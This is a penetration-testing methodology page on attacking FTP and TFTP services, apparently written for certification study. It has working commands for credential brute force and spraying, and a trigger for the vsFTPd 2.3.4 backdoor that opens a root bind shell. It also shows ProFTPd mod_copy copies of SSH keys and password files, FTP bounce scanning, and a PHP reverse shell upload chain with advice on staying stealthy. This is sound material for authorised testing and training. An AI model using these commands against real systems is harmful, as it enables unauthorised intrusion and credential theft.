---
title: FTP - Port 21
description: Enumeration and attack methodology for FTP services on port 21, including anonymous access, credential attacks, known exploits, and TFTP.
---

import { Callout } from 'nextra/components'

# FTP - Port 21

<div className="flex flex-wrap gap-2 mb-4">
  <TagPill color="#ef4444">#Penetration Testing</TagPill>
  <TagPill color="#f97316">#Red Team</TagPill>
  <TagPill color="#22c55e">#Certification</TagPill>
  <TagPill color="#fcc629">#Linux</TagPill>
  <TagPill color="#0078d6">#Windows</TagPill>
</div>

## Cheatsheet

```bash
# Banner grab
nc -nv <IP> 21

# Nmap — service detection + default scripts
nmap -sV -sC -p21 <IP>

# Nmap — all FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-features,ftp-brute -p21 <IP>

# Enumerate FTP server features (FEAT command)
nmap -p21 --script ftp-features <IP>

# Anonymous login (manual)
ftp <IP>
# Username: anonymous | Password: (empty or anonymous)

# Anonymous login (netexec)
nxc ftp <IP> -u 'anonymous' -p ''

# Connect with lftp (enhanced FTP client)
lftp <IP>

# Browser access (paste in Firefox/Chrome)
# ftp://<USER>:<PASS>@<IP>

# Check single credentials
nxc ftp <IP> -u <USER> -p <PASS>

# Credential spray from files
nxc ftp <IP> -u users.txt -p passwords.txt

# Password spray single password
nxc ftp <IP> -u users.txt -p '<PASS>'

# Hydra brute force
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>
hydra -L users.txt -P passwords.txt -t 4 ftp://<IP>

# Nmap brute force
nmap -p21 --script ftp-brute <IP>

# FTP directory enumeration
gobuster dir -u ftp://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Recursive download (anonymous)
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# Recursive download (authenticated)
wget -m --no-passive ftp://<USER>:<PASS>@<IP>

# Mirror with lftp (handles special chars in passwords)
lftp -u <USER>,<PASS> -e "mirror -c / /local/path; quit" ftp://<IP>

# SSL/TLS FTP connection
openssl s_client -connect <IP>:21 -starttls ftp

# Upload a file
ftp <IP>
# ftp> binary
# ftp> put <FILE>

# FTP bounce — port scan internal hosts through FTP
nmap -Pn -b <FTP_USER>@<IP> <INTERNAL_TARGET>

# TFTP — no auth, UDP port 69
nmap -sU -p69 <IP>
tftp <IP>
# tftp> get <FILE>
# tftp> put <FILE>
```

## Methodology

<Callout type="important">
Follow this checklist every time you encounter FTP (port 21). Exhaust zero-credential access before escalating to brute force. Spray any credentials found here against every other service.
</Callout>

### Phase 1: Fingerprint

<Callout type="default" emoji="?">
  **Questions to ask**

  - What exact FTP implementation and version is responding?
  - Does the banner agree with Nmap and protocol behavior, or could it be customized?
  - Which advertised features (AUTH TLS, SITE EXEC, mod_copy) change the available enumeration paths?
  - Are there known CVEs for this exact version, and do the prerequisites match the target?
  - What OS hints does the banner or service response reveal?
</Callout>

- [ ] `nc -nv <IP> 21` — grab banner, note exact server name and version (vsFTPd, ProFTPd, Pure-FTPd, FileZilla, IIS FTP). The banner often reveals the software and version in plaintext before authentication — this is the first clue for exploit hunting.
- [ ] `nmap -sV -sC -p21 <IP>` — run default NSE scripts. The `-sC` flag includes `ftp-anon` which automatically checks if anonymous login is permitted. Look for "Anonymous FTP login allowed" in the output.
- [ ] `nmap -p21 --script ftp-features <IP>` — sends the `FEAT` command to enumerate server capabilities (AUTH TLS, UTF8, MLST, SITE commands). `AUTH TLS` means encrypted connections are possible, `SITE EXEC` could mean command execution, and `SITE CPFR`/`CPTO` indicates mod_copy.
- [ ] Google the exact version string — search `<server> <version> exploit` on Google, Exploit-DB, searchsploit. Be precise: vsFTPd 2.3.4 has a backdoor but 2.3.5 does not.
- [ ] `searchsploit <server> <version>` — check local Exploit-DB for known CVEs. Common hits: vsFTPd 2.3.4 backdoor, ProFTPd mod_copy ( 1.3.5), ProFTPd mod_sql injection, Pure-FTPd buffer overflows.

**Move to Phase 2** when the version is identified and known exploits are catalogued. If a high-confidence exploit exists (e.g. vsFTPd 2.3.4 backdoor), test it immediately before continuing enumeration.

### Phase 2: Anonymous / Null Access

<Callout type="default" emoji="?">
  **Questions to ask**

  - Can I authenticate anonymously, as `ftp`, or with a blank password?
  - Which directories and hidden files are readable?
  - Can I write, rename, overwrite, or delete files?
  - Does the FTP root overlap with a web root or another exposed service?
  - Are there config files, backups, SSH keys, or credentials accessible?
  - What does the directory structure reveal about the server's role?
</Callout>

- [ ] `ftp <IP>` — try `anonymous` / (empty password), `anonymous` / `anonymous`, `ftp` / `ftp`. Anonymous FTP is a feature, not a bug — many servers intentionally allow it for public file sharing, but admins often misconfigure it by granting too much access or leaving sensitive files exposed.
- [ ] `nxc ftp <IP> -u 'anonymous' -p ''` — automated anonymous check, faster than manual login when scanning multiple hosts.
- [ ] If anonymous works: `ls -la` — list everything including hidden files. Hidden files (dotfiles like `.htpasswd`, `.bash_history`, `.ssh/`) are where the gold is — admins forget these exist in FTP-accessible directories.
- [ ] `cd` into every directory — enumerate the full directory tree. Sensitive files are often nested several levels deep in backup, config, or user directories.
- [ ] `get <FILE>` or `mget *` — download everything. Prioritize: config files (database creds, API keys), backups (`.tar.gz`, `.zip`, `.bak`), scripts (may contain hardcoded passwords), `.htpasswd` files (crackable hashes), web roots (`index.php`, `wp-config.php`).
- [ ] `put test.txt` — test write permissions. If the server accepts the upload, note the directory path — this becomes critical if it overlaps with a web server root.
- [ ] Check if FTP root maps to a web server root (`/var/www/html`, `C:\inetpub\wwwroot`). **Writable FTP + web root = RCE** — upload a PHP/ASPX shell and trigger it via HTTP.

**Move to Phase 3** when anonymous access is fully explored and all accessible files are downloaded. If writable access + web root overlap is confirmed, skip to exploitation (PHP Reverse Shell via FTP).

### Phase 3: Default and Harvested Credentials

<Callout type="default" emoji="?">
  **Questions to ask**

  - Which usernames and passwords have already been discovered from other services?
  - Does the service authenticate local system accounts, domain accounts, or application accounts?
  - Are there default credentials specific to the identified FTP server software?
  - Have credential reuse and targeted defaults been exhausted before brute force?
</Callout>

- [ ] Try common defaults: `admin:admin`, `admin:password`, `root:root`, `ftpuser:ftpuser`, `user:user`, `test:test`. Many FTP servers ship with default credentials that are never changed — especially in lab environments, internal networks, and IoT devices.
- [ ] Check if FTP users are system users — on Linux, FTP often authenticates against `/etc/passwd`. Usernames found via SMTP VRFY, `/etc/passwd` dumps, LDAP queries, or RID cycling may work here with common or reused passwords.
- [ ] Spray credentials harvested from other services against FTP. Credential reuse is the single most common way into FTP — a database password from a config file, an SNMP community string, or an LDAP bind credential may work as an FTP login.

**Move to Phase 4** after exhausting default and harvested credentials. Every credential found in *any* service must be tried here before brute forcing.

### Phase 4: Misconfiguration Checks

<Callout type="default" emoji="?">
  **Questions to ask**

  - Is the server vulnerable to FTP bounce (PORT command accepting arbitrary addresses)?
  - Does the version match any known backdoor (vsFTPd 2.3.4) or unauthenticated module (ProFTPd mod_copy)?
  - Does the TLS certificate leak internal hostnames, email addresses, or domain info?
  - Are diagnostic commands (`debug`, `status`, `trace`) enabled and leaking info?
  - Is TFTP (UDP 69) also running with no authentication?
  - Are there hidden directories not shown in `ls` that are still accessible by name?
</Callout>

- [ ] `nmap --script ftp-bounce -p21 <IP>` — test FTP bounce attack. If the server accepts arbitrary addresses in the `PORT` command, it can be used as a proxy to scan internal networks or bypass firewall rules.
- [ ] `nmap --script ftp-vsftpd-backdoor -p21 <IP>` — vsFTPd 2.3.4 backdoor check. Sending a username ending with `:)` opens a bind shell on port 6200. Takes seconds and the payoff is instant root.
- [ ] Check for ProFTPd mod_copy — `SITE CPFR /etc/passwd` then `SITE CPTO /var/www/html/passwd` (unauthenticated file copy). The `mod_copy` module allows any connected user (even unauthenticated) to copy files anywhere the FTP process can reach.
- [ ] `openssl s_client -connect <IP>:21 -starttls ftp` — check for FTPS. Inspect the certificate for hostnames, email addresses, organization names, and internal domain info.
- [ ] `debug` / `status` / `trace` commands inside FTP session — diagnostic commands may leak internal configuration, installation paths, OS info, or module list.
- [ ] `gobuster dir -u ftp://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt` — enumerate directories not visible via `ls`. Some FTP configurations hide directories from listings but allow access if you know the name.
- [ ] Check for TFTP on UDP 69: `nmap -sU -p69 <IP>` — TFTP requires no authentication. Common on network devices for firmware updates and config backups.

### Phase 5: Brute Force (Last Resort)

<Callout type="default" emoji="?">
  **Questions to ask**

  - Have anonymous access, default credentials, and credential reuse been fully exhausted?
  - What lockout, rate-limit, and monitoring controls apply (fail2ban, PAM modules)?
  - Which usernames have the highest probability of success?
  - Is a small targeted wordlist sufficient, or is a large dictionary required?
  - What is the OPSEC cost — will this trigger alerts or ban my IP?
</Callout>

- [ ] `hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>` — keep threads low (`-t 4`) to avoid triggering fail2ban or account lockout. FTP brute force is slow and noisy — every failed login generates a log entry. Only use after exhausting all other credential paths.
- [ ] `nmap -p21 --script ftp-brute <IP>` — nmap-based brute force with built-in credential lists. Useful as a quick check with common creds without Hydra setup.
- [ ] `nxc ftp <IP> -u users.txt -p passwords.txt` — multi-user credential stuffing. Netexec handles the spray pattern automatically with clean output.
- [ ] If locked out, wait or try from a different source IP. Some fail2ban configurations ban the offending IP for 10-30 minutes.

<Callout type="warning">
**OPSEC:** FTP has no built-in encryption (unless FTPS). All credentials, commands, and file contents travel in cleartext. Anyone sniffing the network (including the SOC) can see everything. On a real engagement, prefer SFTP or FTPS if available.
</Callout>

### Phase 6: Post-Access Actions

<Callout type="default" emoji="?">
  **Questions to ask**

  - What files are accessible now that were not visible anonymously?
  - Do any downloaded files contain credentials, keys, or config data?
  - Can newly found credentials be sprayed against SSH, SMB, WinRM, RDP, databases?
  - If writable access exists, does the directory overlap with a web root for RCE?
  - Do FTP credentials also work for SSH (system user authentication)?
</Callout>

- [ ] Download everything: `wget -m --no-passive ftp://<USER>:<PASS>@<IP>`. The `-m` flag mirrors the entire directory tree recursively. Use `--no-passive` if passive mode fails (common behind NAT).
- [ ] Search for credentials in downloaded files: `grep -ri 'password\|passwd\|secret\|key\|token\|credential' ./` — cast a wide net across all downloaded content.
- [ ] Spray any new credentials against all other services: SSH, SMB, WinRM, RDP, MySQL, MSSQL — see [SSH-22](/01-Recon-and-Enumeration/Service-Enum/SSH-22), [SMB](/01-Recon-and-Enumeration/Service-Enum/SMB-137,138,139-445(samba)), [WinRM](/01-Recon-and-Enumeration/Service-Enum/WINRM-5985,5986), [RDP](/01-Recon-and-Enumeration/Service-Enum/RDP-3389). A single password from an FTP config file can unlock the entire network if reused.
- [ ] If writable FTP + web root confirmed: upload a web shell for RCE (see PHP Reverse Shell via FTP below).
- [ ] If FTP creds work for SSH: connect directly for a proper interactive shell, proceed to [File-Transfers](/04-Post-Exploitation/File-Transfers) and privesc.

<Quiz
  question="You found writable anonymous FTP access. What's your first move?"
  options={[
    "Start brute forcing other users",
    "Check if the directory maps to a web root and upload a web shell",
    "Ignore it and move on",
    "Run a full nmap scan again"
  ]}
  answer={1}
  explanation="Writable FTP + web root overlap often leads to RCE via web shell upload. Always check if the FTP root maps to a web-accessible directory before escalating to noisier techniques. Brute forcing is a last resort, not a first step."
/>

## Overview

FTP (File Transfer Protocol) is a standard network protocol for transferring files between hosts over TCP. It operates on a client-server model where the client initiates a connection to upload, download, or manage files and directories on a remote server. Default port: **21**.

FTP was designed in the 1970s with no security in mind — all data, including credentials, is transmitted in **cleartext**. This makes it inherently vulnerable to sniffing attacks on the network. Despite this, FTP remains widely deployed because it is simple, well-supported, and many legacy systems depend on it.

FTP supports two access modes:

- **Anonymous access** — users log in with the username `anonymous` or `ftp` with any password (or no password). Intended for public file sharing, but frequently misconfigured to expose sensitive directories.
- **Authenticated access** — requires a valid username and password. On Linux, FTP typically authenticates against system accounts (`/etc/passwd`), meaning FTP credentials are often the same as SSH credentials.

### How FTP Uses Two Channels

Unlike most protocols that use a single TCP connection, FTP separates control and data into two distinct channels. This dual-channel architecture is what makes FTP tricky with firewalls and NAT — and is also what enables the bounce attack.

| Channel | Port | Purpose |
|---------|------|---------|
| Control | TCP 21 | Commands (`USER`, `PASS`, `LIST`, `RETR`, `STOR`) and server response codes |
| Data | TCP 20 (active) or ephemeral (passive) | Actual file content and directory listings |

**Active vs Passive mode:** In **active mode**, the client tells the server its IP and port via the `PORT` command, and the server initiates a data connection back to the client on that address. This often fails when the client is behind a firewall or NAT because the inbound connection gets blocked. In **passive mode**, the server opens a random high port and tells the client to connect to it via the `PASV` response — the client initiates both connections, which works better through firewalls. If downloads fail, toggle between modes (`passive` command in the FTP session, `--no-passive` flag with wget).

<Callout type="info">
**FTPS vs SFTP — completely different protocols.** FTPS (FTP Secure) wraps the same FTP protocol in SSL/TLS encryption — same commands, same dual-channel architecture, just encrypted. SFTP (SSH File Transfer Protocol) has nothing to do with FTP — it is a file transfer subsystem built into SSH that runs over port 22. SFTP is covered in [SSH-22](/01-Recon-and-Enumeration/Service-Enum/SSH-22).
</Callout>

## Quick Reference

| Task | Command |
|------|---------|
| Connect (ftp) | `ftp <IP>` |
| Connect (lftp — enhanced client) | `lftp <IP>` |
| Connect with port | `ftp <IP> <PORT>` |
| Connect via browser | `ftp://<USER>:<PASS>@<IP>` |
| Banner grab (netcat) | `nc -nv <IP> 21` |
| Banner grab (telnet) | `telnet <IP> 21` |
| SSL/TLS connection | `openssl s_client -connect <IP>:21 -starttls ftp` |
| Nmap default scripts | `nmap -sV -sC -p21 <IP>` |
| Anonymous check (nmap) | `nmap --script ftp-anon -p21 <IP>` |
| Feature enumeration | `nmap -p21 --script ftp-features <IP>` |
| Bounce attack check | `nmap --script ftp-bounce -p21 <IP>` |
| Directory enumeration | `gobuster dir -u ftp://<IP> -w <WORDLIST>` |
| Download everything | `wget -m --no-passive ftp://<USER>:<PASS>@<IP>` |
| Recursive mirror (lftp) | `lftp -u <USER>,<PASS> -e "mirror -c / ./loot; quit" ftp://<IP>` |

## Connection Methods

### FTP Client

```bash
ftp <IP>
ftp <IP> <PORT>
```

The standard `ftp` client is available on virtually every Linux and Windows system. The port argument is optional and defaults to 21. The built-in client is fine for manual enumeration but lacks scripted mirroring and robust error handling — use `lftp` or `wget` for bulk operations.

### lftp (Enhanced Client)

```bash
lftp <IP>
lftp -u <USER>,<PASS> ftp://<IP>
lftp -u <USER>,<PASS> -e "mirror -c / /local/path; quit" ftp://<IP>
```

`lftp` supports bookmarks, automatic mirroring, job control, and scripting. It handles special characters in passwords (e.g., `!`, `@`, `#`) far better than the standard `ftp` client, which often chokes on them. The `mirror -c` flag enables resumable downloads — useful for large files over unstable connections.

### Browser Access

Navigate to the following URL in Firefox or Chrome:

```text
ftp://<USER>:<PASS>@<IP>
ftp://anonymous:anonymous@<IP>
```

Browsers render FTP directories as clickable file listings, useful for quickly browsing directory structures without memorizing session commands. However, browser FTP support is deprecated — Firefox removed it in version 90, Chrome disabled it by default in version 95. If the browser does not handle FTP, fall back to CLI tools.

<Callout type="info">
Credentials in the URL (`ftp://user:pass@host`) are visible in browser history and proxy logs. On engagements, prefer CLI clients to avoid leaving credential artifacts.
</Callout>

## FTP Session Commands

Once connected, these are the commands used most during enumeration and data exfiltration:

| Command | Description |
|---------|-------------|
| `ls -la` | List all files including hidden (dotfiles). Some servers don't support `-la` — try `dir` instead. |
| `dir` | List directory with verbose details (permissions, size, date). Server-dependent formatting. |
| `cd <DIR>` | Change directory on the remote server. |
| `lcd <DIR>` | Change directory on your local machine (controls where `get` saves files). |
| `pwd` | Print current working directory on the server. |
| `get <FILE>` | Download a single file. |
| `mget *` | Download all files in the current directory. Run `prompt off` first to avoid per-file confirmation. |
| `put <FILE>` | Upload a single file. Use to test write permissions or drop a web shell. |
| `mput *` | Upload multiple files. |
| `binary` | Switch to binary transfer mode. **Critical** for non-text files — ASCII mode corrupts executables, archives, and images. |
| `ascii` | Switch to ASCII transfer mode. Only use for plain text files. |
| `passive` | Toggle passive mode on/off. Switch if transfers hang or fail (usually a NAT/firewall issue). |
| `prompt off` | Disable per-file confirmation for `mget`/`mput`. Always run this before bulk downloads. |
| `debug` | Toggle debug output. May reveal internal server paths, module names, and OS info. |
| `status` | Show current session info — transfer mode, connection type, server config details. |
| `quit` | Exit the FTP session. |

<Callout type="default">
Always run `binary` before transferring executables, archives, or images. ASCII mode translates line endings (LF to CRLF), which silently corrupts binary files. A corrupted reverse shell binary will fail to execute on the target with no helpful error message.
</Callout>

## NetExec (nxc)

NetExec is the fastest way to check FTP credentials across multiple hosts. It replaces `crackmapexec` and handles FTP authentication testing with clean, parseable output.

```bash
# Anonymous login check
nxc ftp <IP> -u 'anonymous' -p ''

# Check single credentials
nxc ftp <IP> -u <USER> -p <PASS>

# Credential file spray — tries every user/pass combination
nxc ftp <IP> -u users.txt -p passwords.txt

# Password spray — one password against many users (avoids lockout)
nxc ftp <IP> -u users.txt -p '<PASS>'

# Subnet sweep — find all FTP servers with anonymous access
nxc ftp <SUBNET>/24 -u 'anonymous' -p ''
```

The subnet sweep is particularly valuable during internal assessments — it identifies every FTP server on the network and immediately flags which ones allow anonymous access. Run this early in the engagement to build a target list.

## Brute Force

**OPSEC** — Noise: high · Telemetry: `/var/log/vsftpd.log`, `/var/log/auth.log`, Windows Event Log · Prereq: valid username · Footprint: failed login entries, potential IP ban

Brute forcing FTP involves systematically trying username/password combinations from wordlists. FTP has no built-in rate limiting — protection depends entirely on external tools like fail2ban or PAM modules, which many servers do not configure.

```bash
# Hydra — single user, large password list
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# Hydra — multiple users and passwords
hydra -L users.txt -P passwords.txt ftp://<IP>

# Hydra — low threads + wait time to avoid fail2ban
hydra -L users.txt -P passwords.txt -t 4 -w 5 ftp://<IP>

# Nmap — ftp-brute script (quick check with default credential lists)
nmap -p21 --script ftp-brute <IP>

# Medusa — alternative brute forcer
medusa -h <IP> -U users.txt -P passwords.txt -M ftp
```

<Callout type="warning">
**OPSEC:** FTP brute force is extremely noisy. Every failed login attempt generates a log entry. Most production servers run fail2ban, which bans your IP after 3-5 failed attempts. Keep threads low (`-t 4`), add wait time between attempts (`-w 5`), and **always exhaust anonymous access, default creds, and credential reuse before resorting to brute force**. If banned, wait for the ban to expire (typically 10-30 minutes) or pivot through a different IP.
</Callout>

<Callout type="default">
Before brute forcing with rockyou.txt (14 million entries), try smaller targeted lists first: `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`, `/usr/share/seclists/Passwords/Common-Credentials/top-100.txt`. A 100-entry list that hits in 2 seconds is better than a 14-million-entry list that takes 6 hours and gets you banned.
</Callout>

## Known Exploits

### vsFTPd 2.3.4 — Backdoor (CVE-2011-2523)

**OPSEC** — Noise: low · Telemetry: unusual username in auth log, connection on port 6200 · Prereq: vsFTPd 2.3.4 from compromised source · Footprint: bind shell on TCP 6200

In July 2011, an attacker compromised the vsFTPd master download site and injected a backdoor into the 2.3.4 source tarball. The backdoor is triggered by sending a username containing the `:)` (smiley face) sequence during login. When triggered, it opens a bind shell listening on **port 6200** that provides root access — no password required.

```bash
# Detection — automated nmap script
nmap --script ftp-vsftpd-backdoor -p21 <IP>

# Manual exploitation
nc <IP> 21
USER backdoored:)
PASS anything
# Connection closes — backdoor shell is now listening
nc <IP> 6200
# You now have a root shell
```

The backdoor works by spawning `/bin/sh` as a new process bound to TCP 6200. The username just needs to contain `:)` anywhere — the characters before it do not matter. The password can be anything. If the connection on port 21 closes after the USER command but port 6200 opens, the backdoor is active.

<Callout type="info">
This affects **only** vsFTPd 2.3.4 downloaded from the compromised master site between June 30 and July 1, 2011. Package manager versions (apt, yum) were not affected. Extremely common in CTFs and labs but rare in the wild. Always check — it takes seconds and the payoff is instant root.
</Callout>

### ProFTPd mod_copy — Unauthenticated File Copy

**OPSEC** — Noise: medium · Telemetry: ProFTPd transfer log, file creation timestamps · Prereq: ProFTPd   1.3.5 with mod_copy loaded · Footprint: copied files on disk

The `mod_copy` module in ProFTPd (versions   1.3.5) implements `SITE CPFR` (copy from) and `SITE CPTO` (copy to) commands that allow **any connected user — including unauthenticated users** — to copy files anywhere on the server's filesystem. The copy operation runs with the permissions of the FTP daemon process, which is often root.

```bash
# Connect without authenticating and copy /etc/passwd to web root
nc <IP> 21
SITE CPFR /etc/passwd
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/passwd.txt
250 Copy successful
# Now retrieve via HTTP: http://<IP>/passwd.txt

# Copy SSH private key to accessible location
SITE CPFR /home/<USER>/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
```

This requires zero authentication. The attacker connects to port 21 and immediately issues copy commands. If a web server is also running, any readable file can be copied to the web root and downloaded via HTTP. High-value targets: `/etc/shadow` (if FTP runs as root), SSH private keys, application config files with database credentials, and backup archives.

<Callout type="default">
If there is no web server to exfiltrate through, try copying to other writable locations: `/tmp/`, TFTP root (`/var/lib/tftpboot/`), SMB shares, or NFS exports. Alternatively, copy a PHP web shell *into* the web root — `SITE CPFR /path/to/uploaded/shell.php` then `SITE CPTO /var/www/html/shell.php`.
</Callout>

<Callout type="info">
Patched in ProFTPd 1.3.5b and later. The fix restricts `SITE CPFR`/`CPTO` to authenticated users only. Many systems still run outdated ProFTPd versions — always test.
</Callout>

### FTP Bounce Attack

**OPSEC** — Noise: medium · Telemetry: FTP server logs show PORT commands to internal addresses · Prereq: FTP server accepting arbitrary PORT addresses · Footprint: none on scanned targets (scan originates from FTP server)

The FTP bounce attack exploits the `PORT` command, which tells the server where to send data. If the server does not validate the target address, an attacker can instruct it to send data to **any host and port** — effectively turning the FTP server into a proxy for port scanning internal networks, bypassing firewall rules, and masking the true source of an attack.

```bash
# Nmap — detect if the server is vulnerable to bounce
nmap --script ftp-bounce -p21 <IP>

# Nmap — use FTP server as proxy to port scan an internal target
nmap -Pn -b <FTP_USER>@<IP> <INTERNAL_TARGET>
```

**Manual bounce execution:**

```bash
# Connect to the FTP server
ftp <IP>

# The PORT command format: IP as 4 comma-separated octets, then port as two bytes
# To scan 192.168.1.100 port 80: PORT 192,168,1,100,0,80
# Port calculation: port_hi * 256 + port_lo = target_port
# Example: port 8080 = 31 * 256 + 144 → PORT 192,168,1,100,31,144
quote PORT <TARGET_IP_COMMA_SEP>,<PORT_HI>,<PORT_LO>

# Trigger a data transfer — the server connects to the target
get <FILE>
# If the transfer succeeds, the target port is open
# If it fails with "425 Can't build data connection", the port is closed
```

**Metasploit FTP bounce scanner:**

```bash
msfconsole -q
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS <FTP_IP>
set RPORT 21
run
```

The Metasploit module automates the bounce port scan — it uses the FTP server to probe a range of ports on the target and reports which ones are open. Useful when internal hosts are unreachable directly but an FTP server on the DMZ is accessible.

<Callout type="info">
FTP bounce is rare on modern servers — most implementations now validate that the `PORT` command address matches the client's IP. Older servers, embedded devices, and misconfigured enterprise FTP servers may still be vulnerable. It takes seconds to test and can reveal entire internal networks.
</Callout>

## PHP Reverse Shell via FTP + Web Server

**OPSEC** — Noise: high · Telemetry: web server access log, FTP transfer log, new file on disk, AV/EDR file scan · Prereq: FTP write access + web root overlap + PHP execution · Footprint: PHP shell file persists on disk until cleaned

The classic FTP-to-RCE attack chain: if you can write files to an FTP directory that is also served by a web server capable of executing PHP, you can upload a reverse shell and trigger it via HTTP. Three conditions must be true: **(1)** FTP write access, **(2)** FTP directory overlaps with web root, **(3)** web server executes PHP.

```bash
# 1. Download the PHP reverse shell payload
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

Edit `shell.php` and set your listener IP and port:

```php
$ip = '<LHOST>';   // Your attack machine IP
$port = <LPORT>;   // Port your listener will be on
```

```bash
# 2. Upload the shell via FTP
ftp <IP>
ftp> binary
ftp> put shell.php
ftp> quit

# 3. Start a listener on your attack machine
nc -lvnp <LPORT>

# 4. Trigger the shell — browse to the uploaded file
# http://<IP>/shell.php
# Or: curl http://<IP>/shell.php
```

When the web server processes `shell.php`, PHP executes the reverse shell payload, which connects back to your listener. You now have a shell running as the web server user (typically `www-data` on Linux or `IIS APPPOOL\DefaultAppPool` on Windows).

<Callout type="warning">
The PHP shell file persists on disk after execution. Clean up immediately: `ftp> delete shell.php`. Web shells are detected by file integrity monitoring (AIDE, OSSEC), antivirus signatures, and web application firewalls. For stealth, consider a one-liner shell in a `.htaccess` override or a shell with a randomized filename and authentication gate.
</Callout>

<Callout type="default">
If you do not know whether the FTP directory maps to a web root, check FTP server config files for path directives: vsFTPd uses `anon_root` or `local_root` in `/etc/vsftpd.conf`, ProFTPd uses `DefaultRoot` in `/etc/proftpd/proftpd.conf`, IIS FTP uses site bindings in `C:\Windows\System32\inetsrv\config\applicationHost.config`. Common web roots: `/var/www/html`, `/var/www`, `/srv/http`, `C:\inetpub\wwwroot`, `C:\xampp\htdocs`.
</Callout>

<Quiz
  question="The web server runs ASP.NET instead of PHP. Can you still get RCE through FTP?"
  options={[
    "No — this attack only works with PHP",
    "Yes — upload an .aspx web shell instead and trigger via HTTP",
    "Yes — but only if the server also has PHP installed",
    "No — ASP.NET blocks FTP-uploaded files from executing"
  ]}
  answer={1}
  explanation="The principle is identical: writable FTP + web root + server-side execution = RCE. Match the shell language to the web stack — use .aspx for ASP.NET, .jsp for Tomcat, .php for Apache/PHP. If no server-side execution is available (static HTML server), this attack chain doesn't work, but you can still upload phishing pages or plant files for other exploitation paths."
/>

## TFTP — UDP Port 69

TFTP (Trivial File Transfer Protocol) is a stripped-down file transfer protocol that sacrifices every security feature for simplicity. It has **no authentication**, **no encryption**, **no directory listing**, and runs over **UDP** instead of TCP. TFTP was designed for bootstrapping diskless workstations (PXE boot) and firmware updates on embedded devices — scenarios where simplicity matters more than security.

From a pentest perspective, an open TFTP port is a direct read/write interface to the filesystem with zero access control. The only obstacle is that you must know (or guess) filenames — there is no `ls` command.

```bash
# Scan for TFTP
nmap -sU -p69 <IP>

# Connect and transfer files
tftp <IP>
tftp> get <FILE>
tftp> put <FILE>
tftp> quit
```

| Limitation | Detail |
|-----------|--------|
| No authentication | Anyone can read/write if the service is running |
| No directory listing | You must know or guess the filename |
| UDP only | No connection state — unreliable over lossy networks |
| No encryption | All data in cleartext, easily sniffed |

<Callout type="default">
TFTP is commonly used for PXE boot, firmware updates, and VoIP phone configs. If TFTP is open, try common filenames that often contain credentials in cleartext: network devices (`running-config`, `startup-config`, `backup-config`), VoIP (`phone.cfg`, `SIPDefault.cnf`, `SEP<MAC>.cnf.xml`), boot (`pxelinux.0`, `boot.ini`, `grub.cfg`). Network device configs pulled via TFTP frequently contain SNMP community strings, VPN pre-shared keys, VLAN configurations, and admin passwords in reversible encryption.
</Callout>

## vsFTPd Configuration Reference

vsFTPd (Very Secure FTP Daemon) is the most common FTP server on Linux. Despite the name, its security depends entirely on configuration. The config file is highly readable and contains directives that directly map to attack vectors.

**Config file:** `/etc/vsftpd.conf`
**Blocked users:** `/etc/ftpusers` — users listed here are **denied** FTP access (typically root, daemon, bin)

### Dangerous Settings (Misconfigurations to Look For)

| Setting | Risk |
|---------|------|
| `anonymous_enable=YES` | Anonymous login permitted — immediate file access without credentials |
| `anon_upload_enable=YES` | Anonymous users can upload files — potential web shell drop |
| `anon_mkdir_write_enable=YES` | Anonymous users can create directories — aids in staging payloads |
| `no_anon_password=YES` | No password prompt for anonymous — lowers the bar further |
| `write_enable=YES` | Write commands enabled globally (STOR, DELE, RNFR, MKD, RMD) |
| `anon_root=/var/www/html` | Anonymous root maps to web server root — writable anonymous + this = instant RCE |
| `local_enable=YES` | System users can log in via FTP — FTP creds = SSH creds in most cases |
| `chroot_local_user=NO` | Users NOT jailed to home — can traverse the entire filesystem |
| `ls_recurse_enable=YES` | Recursive `ls` allowed — full directory tree enumeration in one command |
| `hide_ids=NO` | File listings show real UID/GID — reveals system usernames |
| `pasv_min_port` / `pasv_max_port` | Defines passive mode port range — reveals firewall rules and port allocation |

The most dangerous combination is `anonymous_enable=YES` + `anon_upload_enable=YES` + `anon_root=<web_root>`. This gives any unauthenticated user the ability to upload executable files directly into the web server's document root — a trivial path to RCE.

<Quiz
  question="You see anonymous_enable=YES and anon_upload_enable=YES in a vsftpd config. What's the attack path?"
  options={[
    "Check anon_root — if it points to a web-accessible directory, upload a web shell",
    "Brute force the admin account since anonymous is already enabled",
    "Ignore anonymous access and focus on authenticated users",
    "Try to crash the server with large file uploads"
  ]}
  answer={0}
  explanation="The critical check is whether anon_root points to a web-accessible directory. If so, upload a web shell immediately. Even without web root overlap, consider uploading crafted files that a cron job or other service might process. Always download existing files first before uploading — don't lose access by breaking the service or triggering an alert."
/>

## Default Credentials

These credentials are worth trying against any FTP server before resorting to brute force. Anonymous access is a feature, not a vulnerability — but many servers are deployed with it enabled unintentionally.

| Server | Username | Password |
|--------|----------|----------|
| Generic FTP | `anonymous` | (empty) |
| Generic FTP | `anonymous` | `anonymous` |
| Generic FTP | `ftp` | `ftp` |
| vsFTPd | `anonymous` | (empty) |
| FileZilla Server | `admin` | `admin` |
| ProFTPd | `anonymous` | (empty) |
| IIS FTP | `anonymous` | `anonymous` |
| Cerberus FTP | `admin` | `admin` |
| Xlight FTP | `admin` | (empty) |
| WS_FTP | `admin` | `admin` |
| Gene6 FTP | `admin` | (empty) |

<Callout type="default">
If `local_enable=YES` is set, FTP authenticates against system accounts. Try any usernames discovered through other enumeration (SMTP VRFY, RID cycling, LDAP, `/etc/passwd` from LFI) with common passwords like `password`, `<username>123`, `Welcome1`, `changeme`.
</Callout>

## Common Mistakes

<Callout type="error">
  - **Forgetting `binary` mode** — uploading executables or archives in ASCII mode silently corrupts them. The reverse shell binary fails on the target with no helpful error.
